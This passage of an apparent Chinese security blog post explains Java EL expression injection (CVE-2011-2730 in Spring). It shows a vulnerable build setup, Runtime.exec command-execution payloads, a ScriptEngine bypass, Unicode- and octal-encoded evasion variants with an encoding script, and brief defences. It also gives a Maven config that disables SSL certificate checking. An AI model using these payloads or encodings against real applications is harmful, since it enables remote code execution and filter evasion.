保持你指定的名称 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>CVE-2011-27330<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>Reproduction environment for internal reference CVE-2011-27330 (based on CVE-2011-2730)<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">project.build.sourceEncoding</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.6<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.6<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">spring.version</span>&gt;</span>3.0.5.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">spring.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet.version</span>&gt;</span>2.5<span class="hljs-tag">&lt;/<span class="hljs-name">servlet.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jsp.version</span>&gt;</span>2.1<span class="hljs-tag">&lt;/<span class="hljs-name">jsp.version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jstl.version</span>&gt;</span>1.2<span class="hljs-tag">&lt;/<span class="hljs-name">jstl.version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Core Spring MVC (vulnerable version) --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-webmvc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Provided by Servlet Container --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;servlet.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jsp-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;jsp.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- JSTL for taglibs --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jstl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>$&#123;jstl.version&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Logging --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-logging<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.13.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.junit.jupiter<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit-jupiter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>CVE-2011-27330<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>$&#123;maven.compiler.source&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>$&#123;maven.compiler.target&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br><br>      <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-war-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">failOnMissingWebXml</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">failOnMissingWebXml</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p>之后使用 maven 进行构建 .war 包用于 tomcat 运行。</p><p>这里使用 maven 时遇到一个 SSL 证书验证的问题，这里更改配置文件 setting.xml 禁用验证。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">settings</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">profiles</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">profile</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>insecure<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.wagon.http.ssl.insecure</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">maven.wagon.http.ssl.insecure</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.wagon.http.ssl.allowall</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">maven.wagon.http.ssl.allowall</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">maven.wagon.http.ssl.ignore.validity.dates</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">maven.wagon.http.ssl.ignore.validity.dates</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">profile</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">profiles</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">activeProfiles</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">activeProfile</span>&gt;</span>insecure<span class="hljs-tag">&lt;/<span class="hljs-name">activeProfile</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">activeProfiles</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将以上文本复制到 <code>C:\Users\&lt;用户名&gt;\.m2\settings.xml</code> 文件中，之后执行 maven 就可以了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171122789.png" alt="img"></p><p>部署 Tomcat 服务器：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171120455.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171122271.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171120210.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511171120324.png" alt="img"></p><h4 id="2-3-2-漏洞原理"><a href="#2-3-2-漏洞原理" class="headerlink" title="2.3.2 漏洞原理"></a>2.3.2 漏洞原理</h4><p>命令执行PoC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;spring:message text=<span class="hljs-string">&quot;$&#123;/&quot;</span>/<span class="hljs-string">&quot;.getClass().forName(/&quot;</span>java.lang.Runtime/<span class="hljs-string">&quot;).getMethod(/&quot;</span>getRuntime/<span class="hljs-string">&quot;,null).invoke(null,null).exec(/&quot;</span>calc/<span class="hljs-string">&quot;,null).toString()&#125;&quot;</span>&gt;&lt;/spring:message&gt;<br></code></pre></td></tr></table></figure><p>正常情况下为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ taglib uri=<span class="hljs-string">&quot;http://www.springframework.org/tags&quot;</span> prefix=<span class="hljs-string">&quot;spring&quot;</span>%&gt;<br>&lt;spring:message  text=<span class="hljs-string">&quot;$&#123;param.a&#125;&quot;</span>&gt;&lt;/spring:message&gt;<br></code></pre></td></tr></table></figure><p>这里使用 message 标签，text 属性用 el表达式从请求参数中取值，这样当访问</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">http:<span class="hljs-comment">//localhost/test.jsp?a=$&#123;applicationScope&#125;</span><br></code></pre></td></tr></table></figure><p><code>${applicationScope}</code> 这段字符串会被当做 el表达式被执行，而不是作为字符串直接显示在页面上，我们改变提交的 el表达式，就可以获取我们需要的信息了，这就达到了 el表达式注入的效果。</p><h1 id="3、EL表达式的EXP与基础绕过"><a href="#3、EL表达式的EXP与基础绕过" class="headerlink" title="3、EL表达式的EXP与基础绕过"></a>3、EL表达式的EXP与基础绕过</h1><h2 id="3-1-基础-EXP"><a href="#3-1-基础-EXP" class="headerlink" title="3.1 基础 EXP"></a>3.1 基础 EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-string">&quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;calc.exe&#x27;)&#125;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="3-2-利用-ScriptEngine-调用-JS-引擎绕过"><a href="#3-2-利用-ScriptEngine-调用-JS-引擎绕过" class="headerlink" title="3.2  利用 ScriptEngine 调用 JS 引擎绕过"></a>3.2  利用 ScriptEngine 调用 JS 引擎绕过</h2><p>同 SpEL 注入中讲到的</p><p><strong>ScriptEngineExec.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> drunkbaby.basicelvul;  <br><br><span class="hljs-keyword">import</span> de.odysseus.el.ExpressionFactoryImpl;  <br><span class="hljs-keyword">import</span> de.odysseus.el.util.SimpleContext;  <br><br><span class="hljs-keyword">import</span> javax.el.ExpressionFactory;  <br><span class="hljs-keyword">import</span> javax.el.ValueExpression;  <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScriptEngineExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        <span class="hljs-type">ExpressionFactory</span> <span class="hljs-variable">expressionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExpressionFactoryImpl</span>();  <br>        <span class="hljs-type">SimpleContext</span> <span class="hljs-variable">simpleContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleContext</span>();  <br>        <span class="hljs-comment">// failed  </span><br>        <span class="hljs-comment">// String exp = &quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&#125;&quot;; // ok String exp = &quot;$&#123;&#x27;&#x27;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;java.lang.Runtime.getRuntime().exec(&#x27;Calc.exe&#x27;)\&quot;)&#125;\n&quot; +  </span><br>        <span class="hljs-string">&quot; &quot;</span>;  <br>        <span class="hljs-type">ValueExpression</span> <span class="hljs-variable">valueExpression</span> <span class="hljs-operator">=</span> expressionFactory.createValueExpression(simpleContext, exp, String.class);  <br>        System.out.println(valueExpression.getValue(simpleContext));  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="利用-Unicode-编码绕过"><a href="#利用-Unicode-编码绕过" class="headerlink" title="利用 Unicode 编码绕过"></a>利用 Unicode 编码绕过</h3><p>对可利用的 PoC 进行全部或部分的 Unicode 编码都是 OK 的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// Unicode编码内容为前面反射调用的PoC</span><br>\u0024\u007b\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0027\u0063\u0061\u006c\u0063\u002e\u0065\u0078\u0065\u0027\u0029\u007d<br></code></pre></td></tr></table></figure><h3 id="利用八进制编码绕过"><a href="#利用八进制编码绕过" class="headerlink" title="利用八进制编码绕过"></a>利用八进制编码绕过</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 八进制编码内容为前面反射调用的PoC</span><br>\<span class="hljs-number">44</span>\<span class="hljs-number">173</span>\<span class="hljs-number">47</span>\<span class="hljs-number">47</span>\<span class="hljs-number">56</span>\<span class="hljs-number">147</span>\<span class="hljs-number">145</span>\<span class="hljs-number">164</span>\<span class="hljs-number">103</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">163</span>\<span class="hljs-number">50</span>\<span class="hljs-number">51</span>\<span class="hljs-number">56</span>\<span class="hljs-number">146</span>\<span class="hljs-number">157</span>\<span class="hljs-number">162</span>\<span class="hljs-number">116</span>\<span class="hljs-number">141</span>\<span class="hljs-number">155</span>\<span class="hljs-number">145</span>\<span class="hljs-number">50</span>\<span class="hljs-number">47</span>\<span class="hljs-number">152</span>\<span class="hljs-number">141</span>\<span class="hljs-number">166</span>\<span class="hljs-number">141</span>\<span class="hljs-number">56</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">156</span>\<span class="hljs-number">147</span>\<span class="hljs-number">56</span>\<span class="hljs-number">122</span>\<span class="hljs-number">165</span>\<span class="hljs-number">156</span>\<span class="hljs-number">164</span>\<span class="hljs-number">151</span>\<span class="hljs-number">155</span>\<span class="hljs-number">145</span>\<span class="hljs-number">47</span>\<span class="hljs-number">51</span>\<span class="hljs-number">56</span>\<span class="hljs-number">147</span>\<span class="hljs-number">145</span>\<span class="hljs-number">164</span>\<span class="hljs-number">115</span>\<span class="hljs-number">145</span>\<span class="hljs-number">164</span>\<span class="hljs-number">150</span>\<span class="hljs-number">157</span>\<span class="hljs-number">144</span>\<span class="hljs-number">50</span>\<span class="hljs-number">47</span>\<span class="hljs-number">145</span>\<span class="hljs-number">170</span>\<span class="hljs-number">145</span>\<span class="hljs-number">143</span>\<span class="hljs-number">47</span>\<span class="hljs-number">54</span>\<span class="hljs-number">47</span>\<span class="hljs-number">47</span>\<span class="hljs-number">56</span>\<span class="hljs-number">147</span>\<span class="hljs-number">145</span>\<span class="hljs-number">164</span>\<span class="hljs-number">103</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">163</span>\<span class="hljs-number">50</span>\<span class="hljs-number">51</span>\<span class="hljs-number">51</span>\<span class="hljs-number">56</span>\<span class="hljs-number">151</span>\<span class="hljs-number">156</span>\<span class="hljs-number">166</span>\<span class="hljs-number">157</span>\<span class="hljs-number">153</span>\<span class="hljs-number">145</span>\<span class="hljs-number">50</span>\<span class="hljs-number">47</span>\<span class="hljs-number">47</span>\<span class="hljs-number">56</span>\<span class="hljs-number">147</span>\<span class="hljs-number">145</span>\<span class="hljs-number">164</span>\<span class="hljs-number">103</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">163</span>\<span class="hljs-number">163</span>\<span class="hljs-number">50</span>\<span class="hljs-number">51</span>\<span class="hljs-number">56</span>\<span class="hljs-number">146</span>\<span class="hljs-number">157</span>\<span class="hljs-number">162</span>\<span class="hljs-number">116</span>\<span class="hljs-number">141</span>\<span class="hljs-number">155</span>\<span class="hljs-number">145</span>\<span class="hljs-number">50</span>\<span class="hljs-number">47</span>\<span class="hljs-number">152</span>\<span class="hljs-number">141</span>\<span class="hljs-number">166</span>\<span class="hljs-number">141</span>\<span class="hljs-number">56</span>\<span class="hljs-number">154</span>\<span class="hljs-number">141</span>\<span class="hljs-number">156</span>\<span class="hljs-number">147</span>\<span class="hljs-number">56</span>\<span class="hljs-number">122</span>\<span class="hljs-number">165</span>\<span class="hljs-number">156</span>\<span class="hljs-number">164</span>\<span class="hljs-number">151</span>\<span class="hljs-number">155</span>\<span class="hljs-number">145</span>\<span class="hljs-number">47</span>\<span class="hljs-number">51</span>\<span class="hljs-number">56</span>\<span class="hljs-number">147</span>\<span class="hljs-number">145</span>\<span class="hljs-number">164</span>\<span class="hljs-number">115</span>\<span class="hljs-number">145</span>\<span class="hljs-number">164</span>\<span class="hljs-number">150</span>\<span class="hljs-number">157</span>\<span class="hljs-number">144</span>\<span class="hljs-number">50</span>\<span class="hljs-number">47</span>\<span class="hljs-number">147</span>\<span class="hljs-number">145</span>\<span class="hljs-number">164</span>\<span class="hljs-number">122</span>\<span class="hljs-number">165</span>\<span class="hljs-number">156</span>\<span class="hljs-number">164</span>\<span class="hljs-number">151</span>\<span class="hljs-number">155</span>\<span class="hljs-number">145</span>\<span class="hljs-number">47</span>\<span class="hljs-number">51</span>\<span class="hljs-number">56</span>\<span class="hljs-number">151</span>\<span class="hljs-number">156</span>\<span class="hljs-number">166</span>\<span class="hljs-number">157</span>\<span class="hljs-number">153</span>\<span class="hljs-number">145</span>\<span class="hljs-number">50</span>\<span class="hljs-number">156</span>\<span class="hljs-number">165</span>\<span class="hljs-number">154</span>\<span class="hljs-number">154</span>\<span class="hljs-number">51</span>\<span class="hljs-number">54</span>\<span class="hljs-number">47</span>\<span class="hljs-number">143</span>\<span class="hljs-number">141</span>\<span class="hljs-number">154</span>\<span class="hljs-number">143</span>\<span class="hljs-number">56</span>\<span class="hljs-number">145</span>\<span class="hljs-number">170</span>\<span class="hljs-number">145</span>\<span class="hljs-number">47</span>\<span class="hljs-number">51</span>\<span class="hljs-number">175</span><br></code></pre></td></tr></table></figure><p>JohnFord 师傅的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;$&#123;&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;exec&#x27;,&#x27;&#x27;.getClass()).invoke(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;).getMethod(&#x27;getRuntime&#x27;).invoke(null),&#x27;calc.exe&#x27;)&#125;&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>  num = <span class="hljs-string">&quot;\\&quot;</span> + <span class="hljs-built_in">oct</span>(<span class="hljs-built_in">ord</span>(s))<br>  result += num<br><span class="hljs-built_in">print</span>(result.replace(<span class="hljs-string">&quot;\\0&quot;</span>, <span class="hljs-string">&quot;\\&quot;</span>))<br></code></pre></td></tr></table></figure><h2 id="4、-防御方法"><a href="#4、-防御方法" class="headerlink" title="4、 防御方法"></a>4、 防御方法</h2><ul><li><p>尽量不使用外部输入的内容作为 EL 表达式内容；</p></li><li><p>若使用，则严格过滤EL表达式注入漏洞的 payload 关键字；</p></li><li><p>如果是排查 Java 程序中 JUEL 相关代码，则搜索如下关键类方法：</p></li><li><ul><li>javax.el.ExpressionFactory.createValueExpression()</li><li>javax.el.ValueExpression.getValue()</li></ul></li></ul><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>java—-EL表达式：</p><p><a href="https://blog.csdn.net/pan_junbiao/article/details/88567466">https://blog.csdn.net/pan_junbiao/article/details/88567466</a></p><p><a href="https://www.runoob.com/jsp/jsp-expression-language.html">https://www.runoob.com/jsp/jsp-expression-language.html</a></p><p>Spring框架标签EL表达式执行漏洞分析（CVE-2011-2730） – lupin</p><p><a href="https://www.vuln.cn/6484">https://www.vuln.cn/6484</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>EL 表达式注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpEL 表达式注入</title>
    <link href="/2025/11/17/SpEL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/11/17/SpEL%20%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    
